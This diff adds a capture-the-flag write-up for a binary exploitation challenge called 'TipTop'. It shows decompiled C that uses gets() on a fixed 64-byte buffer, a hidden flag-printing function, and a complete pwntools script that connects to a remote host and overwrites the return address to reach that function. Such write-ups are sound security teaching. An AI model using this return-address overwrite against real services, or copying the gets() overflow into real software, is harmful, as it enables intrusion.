@@ -157,3 +157,98 @@ HTB{570004}
 
 ```
 
+
+## Challenge: TipTop
+
+### Description
+
+This is a binary exploitation challenge focused on leveraging a buffer overflow vulnerability to redirect execution flow and access a hidden function that reveals the flag.
+
+### Initial Analysis
+
+Running the binary prompts:
+
+```
+
+Tipi tipi top top. What color do you want?
+
+1. Black
+2. Blue
+3. Green
+4. White
+5. Orange
+
+```
+If you decompile the binary in ghidra, you can find the option to select here is 4.
+
+![Image](images/Picture8.png)
+
+Upon selecting option **4**, the program asks:
+
+```
+
+What's the magic colour name?:
+
+````
+
+Reverse engineering with **Ghidra** reveals that this input is processed by the function:
+
+```c
+void magic_menu(void) {
+    char local_48[64];
+    printf("What's the magic colour name?: ");
+    gets(local_48);  // ❗ Vulnerable to buffer overflow
+}
+````
+
+A hidden function exists in the binary:
+
+```c
+void magiccolour(void) {
+    char local_58[72];
+    FILE *local_10 = fopen("flag.txt", "r");
+    if (local_10 == NULL) {
+        puts("No flag.txt found in the current directory.");
+    } else {
+        fgets(local_58, 0x40, local_10);
+        printf("Flag: %s\n", local_58);
+        fclose(local_10);
+    }
+}
+```
+
+This function is never called during normal execution and must be invoked manually via exploitation.
+
+### Exploitation Plan
+
+1. Overflow the 64-byte buffer in `magic_menu`.
+2. Overwrite the return address with the address of magiccolour()
+3. Return cleanly using a gadget (ret) to align the stack if needed
+
+### Exploit Code
+
+```python
+from pwn import *
+
+# Connect to remote
+p = remote('4.240.104.200', 6974)
+
+# Wait for color menu
+p.recvuntil(b'5. Orange\n')
+p.sendline(b'4')  # Choose option to reach gets()
+
+# Build payload
+# 64 bytes buffer + 8 bytes to overwrite saved RBP + RET gadget + address of magiccolour()
+payload = b'A'*64 + p64(1) + p64(0x0000000000401016) + p64(0x401196)
+
+# Send the payload
+p.sendline(payload)
+
+# Get flag	
+p.interactive()
+
+```
+If we run this exploit, we can get the flag. 
+
+![Image](images/Picture9.png)
+
